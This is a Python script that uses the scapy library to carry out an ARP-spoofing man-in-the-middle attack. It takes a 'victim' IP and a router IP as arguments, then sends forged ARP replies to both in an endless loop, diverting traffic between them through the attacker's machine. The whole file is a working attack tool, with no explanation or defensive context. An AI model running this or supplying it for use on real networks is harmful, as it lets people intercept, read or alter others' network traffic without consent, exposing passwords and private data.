import os
import time
import logging
import scapy.all as scapy
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
import sys

victim_mac = ''
router_mac = ''
victim_ip = '192.168.1.219'
router_ip = '192.168.1.1'


def ishex(c: chr):
    return c.isdigit or c in 'abcdef'


def good_mac(mac_address: str):
    for num in mac_address.split(':'):
        if not ishex(num[0]) or not ishex(num[1]):
            return False
    return True


def get_mac_address(ip):
    global victim_mac
    global router_mac
    global victim_ip
    global router_ip
    if ip == victim_ip and victim_mac != '':
        return victim_mac
    if ip == router_ip and router_mac != '':
        return router_mac
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        mac = answer[0][1].hwsrc
        if ip == victim_ip:
            victim_mac = mac
        if ip == router_ip:
            router_mac = mac
        return mac
    except IndexError:
        if ip == victim_ip:
            return victim_mac
        else:
            return router_mac


def arp_poison(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip,
                 hwdst=get_mac_address(target_ip))
    scapy.send(packet, verbose=False)


def poison():
    global victim_mac
    global router_mac
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    while not victim_mac or not router_mac:
        victim_mac = get_mac_address(victim_ip)
        router_mac = get_mac_address(router_ip)
    print(f'Starting to poison the connection between:\n1) {victim_ip}, {victim_mac}\n2) {router_ip}, {router_mac}')
    n = 0

    while True:
        arp_poison(victim_ip, router_ip)
        n += 1
        print(f'\r{n}', end='')
        time.sleep(1)
        arp_poison(router_ip, victim_ip)
        n += 1
        print(f'\r{n}', end='')
        time.sleep(1)


if __name__ == "__main__":
    os.system('mode 50, 20')
    sys.argv.pop(0)
    args = sys.argv
    if len(args) != 2:
        print('Invalid number of arguments')
        time.sleep(2)
        exit(1)
    victim_ip = args[0]
    router_ip = args[1]
    print(f'Victim IP: {victim_ip}\nSERVER IP: {router_ip}')
    poison()
